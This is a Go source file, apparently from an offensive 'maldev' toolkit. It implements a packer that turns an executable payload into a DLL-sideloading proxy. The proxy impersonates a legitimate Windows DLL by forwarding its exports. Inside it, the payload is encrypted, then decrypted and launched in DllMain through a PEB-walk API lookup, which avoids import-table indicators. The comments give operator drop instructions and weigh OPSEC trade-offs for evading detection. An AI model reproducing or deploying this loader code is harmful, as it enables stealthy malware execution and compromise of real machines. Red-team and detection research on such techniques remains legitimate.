package packer

import (
	"fmt"

	"github.com/oioio-space/maldev/pe/dllproxy"
	"github.com/oioio-space/maldev/pe/packer/transform"
)

// ProxyDLLOptions parameterises [PackProxyDLL] — the fused
// (single-file) variant of the EXE→DLL sideloading pipeline.
// See [ChainedProxyDLLOptions] for the chained two-file variant.
type ProxyDLLOptions struct {
	// PackOpts tunes the inner [PackBinary] call. ConvertEXEtoDLL
	// is FORCED to true regardless of the caller-supplied value.
	PackOpts PackBinaryOptions

	// TargetName is the legitimate DLL name whose exports the
	// fused proxy mirrors (e.g. "version" for version.dll).
	TargetName string

	// Exports is the list of exports to forward. Use
	// [pe/parse.Exports] to extract them from a real DLL on the
	// operator host.
	Exports []dllproxy.Export

	// PathScheme controls how forwarder strings address the
	// legitimate target DLL. Zero defaults to the
	// PerfectDLLProxy GLOBALROOT scheme.
	PathScheme dllproxy.PathScheme
}

// PackProxyDLL emits the **single-file fused proxy** (Path B from
// docs/refactor-2026-doc/packer-exe-to-dll-plan.md slice 6). One
// PE that:
//
//  1. Has IMAGE_FILE_DLL set + an export table mirroring the
//     legitimate target's exports (each forwarded via the
//     perfect-dll-proxy absolute path scheme by default).
//  2. Carries the original EXE input encrypted in .text plus a
//     DllMain stub appended as a new section. On
//     DLL_PROCESS_ATTACH the stub decrypts .text once, resolves
//     `kernel32!CreateThread` via PEB walk (no IAT entry on
//     LoadLibraryA — that's the win over the chained Path A),
//     spawns a thread on the original OEP, returns TRUE.
//
// Drop the result under the legitimate target's filename next to
// a host EXE that imports from it. The host LoadLibrary's the
// proxy; DllMain runs the payload + every exported call is
// forwarded back to the real target.
//
// Returns (proxyDLLBytes, key, err). Single drop, no
// LoadLibraryA IOC in the IAT (CreateThread resolved at runtime
// via PEB walk).
//
// **OPSEC trade-off vs. [PackChainedProxyDLL]:** single-file
// drop + cleaner IAT (no LoadLibraryA), but the resulting DLL
// is bigger (carries both the encrypted EXE payload AND the
// export table forwarders).
func PackProxyDLL(input []byte, opts ProxyDLLOptions) (proxy, key []byte, err error) {
	if opts.TargetName == "" {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL TargetName required")
	}
	if len(opts.Exports) == 0 {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL Exports required")
	}

	// Step 1 — pack as converted DLL.
	packOpts := opts.PackOpts
	packOpts.ConvertEXEtoDLL = true
	if packOpts.Format == FormatUnknown {
		packOpts.Format = FormatWindowsExe
	}
	converted, key, err := PackBinary(input, packOpts)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL pack converted: %w", err)
	}

	// Step 2 — compute the RVA where the export section will
	// land in the converted output, build the export-data bytes
	// with that RVA baked in.
	exportRVA, err := transform.NextAvailableRVA(converted)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL next RVA: %w", err)
	}
	exportBytes, _, err := dllproxy.BuildExportData(opts.TargetName, opts.Exports, opts.PathScheme, exportRVA)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL build export data: %w", err)
	}

	// Step 3 — append the export section and patch DataDirectory[EXPORT].
	fused, err := transform.AppendExportSection(converted, exportBytes, exportRVA)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: PackProxyDLL append export section: %w", err)
	}

	return fused, key, nil
}

// PackProxyDLLFromTarget is a convenience wrapper around
// [PackProxyDLL] that infers the export list from a real target DLL
// supplied as bytes. The caller still owns [ProxyDLLOptions.TargetName]
// (the on-disk filename the proxy will impersonate) because the
// PE itself does not carry a reliable canonical name string.
//
// Named exports are kept verbatim (Name + Ordinal). Ordinal-only
// entries are skipped — [pe/dllproxy.Generate] would forward them
// via "#N" strings, but the converted-DLL fused emitter currently
// constructs forwarder strings only from explicit names, so an
// ordinal-only loader call into the proxy would miss the table.
// Operators wanting ordinal coverage should call [PackProxyDLL]
// directly with a manually-built [dllproxy.Export] slice.
//
// Returns the same (proxy, key) pair as [PackProxyDLL]. Errors when
// the target has no named exports or [ProxyDLLOptions.TargetName] is
// blank.
func PackProxyDLLFromTarget(payload, targetDLLBytes []byte, opts ProxyDLLOptions) (proxy, key []byte, err error) {
	if opts.TargetName == "" {
		return nil, nil, fmt.Errorf("packer: proxy-from-target: TargetName required (cannot infer from binary)")
	}
	exports, err := dllproxy.ExportsFromBytes(targetDLLBytes)
	if err != nil {
		return nil, nil, fmt.Errorf("packer: proxy-from-target: %w", err)
	}
	if len(exports) == 0 {
		return nil, nil, fmt.Errorf("packer: proxy-from-target: target has no named exports")
	}
	opts.Exports = exports
	return PackProxyDLL(payload, opts)
}
